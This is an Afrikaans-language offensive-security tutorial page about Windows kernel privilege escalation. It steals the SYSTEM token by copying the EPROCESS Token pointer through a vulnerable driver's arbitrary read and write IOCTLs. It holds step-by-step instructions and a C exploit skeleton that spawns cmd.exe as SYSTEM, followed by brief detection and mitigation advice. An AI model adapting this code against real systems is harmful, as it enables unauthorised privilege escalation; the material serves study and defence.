# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

As 'n kwesbare driver 'n IOCTL blootstel wat 'n aanvaller arbitêre kernel lees- en/of skryf-primitives gee, kan opgradering na NT AUTHORITY\SYSTEM dikwels bereik word deur 'n SYSTEM-toegangs-Token te steel. Die tegniek kopieer die Token-pen van 'n SYSTEM-proses se EPROCESS na die huidige proses se EPROCESS.

Waarom dit werk:
- Elke proses het 'n EPROCESS-struktuur wat (onder ander velde) 'n Token bevat (egter 'n EX_FAST_REF na 'n token-objek).
- Die SYSTEM-proses (PID 4) hou 'n token met alle voorregte geaktiveer.
- Deur die huidige proses se EPROCESS.Token te vervang met die SYSTEM-token-pen, hardloop die huidige proses onmiddellik as SYSTEM.

Let wel: offsets in EPROCESS verskil oor Windows-weergawes. Bepaal dit dinamies (simboles) of gebruik weergawespesifieke konstantes. Onthou ook dat EPROCESS.Token 'n EX_FAST_REF is (die laagste 3 bisse is verwysingtelling-vlae).

## Hoëvlakstappe

1) Vind die basis van ntoskrnl.exe en los die adres van PsInitialSystemProcess op.
- Vanaf gebruikermodus, gebruik NtQuerySystemInformation(SystemModuleInformation) of EnumDeviceDrivers om gelaaide driver-bases te kry.
- Voeg die offset van PsInitialSystemProcess (van simboles/reversing) by die kernel-basis om sy adres te kry.
2) Lees die pen by PsInitialSystemProcess → dit is 'n kernel-pen na SYSTEM se EPROCESS.
3) Vanaf die SYSTEM EPROCESS, lees die offsets van UniqueProcessId en ActiveProcessLinks om die dubbel-gekoppelde lys van EPROCESS-strukture te deurkruis (ActiveProcessLinks.Flink/Blink) totdat jy die EPROCESS vind waarvan UniqueProcessId gelyk is aan GetCurrentProcessId(). Hou albei:
- EPROCESS_SYSTEM (vir SYSTEM)
- EPROCESS_SELF (vir die huidige proses)
4) Lees SYSTEM token waarde: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Masker die laagste 3 bisse uit: Token_SYS_masked = Token_SYS & ~0xF (gewoonlik ~0xF of ~0x7 afhangend van die build; op x64 word die laagste 3 bisse gebruik — 0xFFFFFFFFFFFFFFF8 masker).
5) Opsie A (algemeen): Bewaar die laagste 3 bisse van jou huidige token en heg dit aan SYSTEM se pen om die ingebedde verwysingtelling konsekwent te hou.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Skryf Token_NEW terug in (EPROCESS_SELF + TokenOffset) met jou kernel-skryfprimitive.
7) Jou huidige proses is nou SYSTEM. Opsioneel spawn 'n nuwe cmd.exe of powershell.exe om te bevestig.

## Pseudokode

Hieronder is 'n ruggraat wat slegs twee IOCTLs van 'n kwesbare driver gebruik, een vir 8-byte kernel lees en een vir 8-byte kernel skryf. Vervang dit met jou driver se koppelvlak.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Aantekeninge:
- Offsets: Gebruik WinDbg se `dt nt!_EPROCESS` met die teiken se PDBs, of 'n runtime-simboollader, om die korrekte ofsette te kry. Moet nie blindelings hardcodeer nie.
- Masker: Op x64 is die token 'n EX_FAST_REF; die lae 3 bits is verwysingstellings-bits. Die oorspronklike lae bits van jou token behou voorkom onmiddellike refcount-onkonsekwenthede.
- Stabiliteit: Liewer verhoog die huidige proses; as jy 'n kortlewende helper verhoog, kan jy SYSTEM verloor wanneer dit afsluit.

## Opsporing en versagting
- Die laai van ongetekende of onbetroubare derdeparty-drivers wat kragtige IOCTLs blootstel, is die kernoorsaak.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, en Attack Surface Reduction-reëls kan verhoed dat kwesbare drivers gelaai word.
- EDR kan let op verdagte IOCTL-reekse wat arbitêre read/write implementeer en op token-wisselings.

## Verwysings
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
